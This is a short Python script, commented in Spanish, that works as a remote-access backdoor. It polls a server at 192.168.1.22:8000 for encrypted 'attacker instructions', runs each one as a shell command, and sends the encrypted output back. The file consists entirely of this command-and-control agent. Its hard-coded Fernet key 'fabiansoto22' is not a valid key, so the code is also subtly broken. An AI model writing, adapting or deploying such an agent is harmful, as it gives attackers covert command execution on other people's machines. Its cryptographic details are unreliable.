import requests
import os
import subprocess
from cryptography.fernet import Fernet

def main():
    # Configuración del servidor
    url = "http://192.168.1.22:8000"  # Cambia a la URL del servidor

    # Generar llave de cifrado
    llave = b'fabiansoto22'  # Usa una llave fija y segura

    while True:
        try:
            # Recibir instrucción del atacante
            mensaje_cifrado = requests.get(url).content
            if not mensaje_cifrado:
                continue

            # Descifrar mensaje
            f = Fernet(llave)
            mensaje_descifrado = f.decrypt(mensaje_cifrado).decode()

            if mensaje_descifrado == "exit":
                break

            # Ejecutar comando
            comando = mensaje_descifrado
            resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mensaje = f"Resultado del comando: {resultado.stdout.decode()}\nError: {resultado.stderr.decode()}"
            mensaje_cifrado = f.encrypt(mensaje.encode())
            requests.post(url, data=mensaje_cifrado)

        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
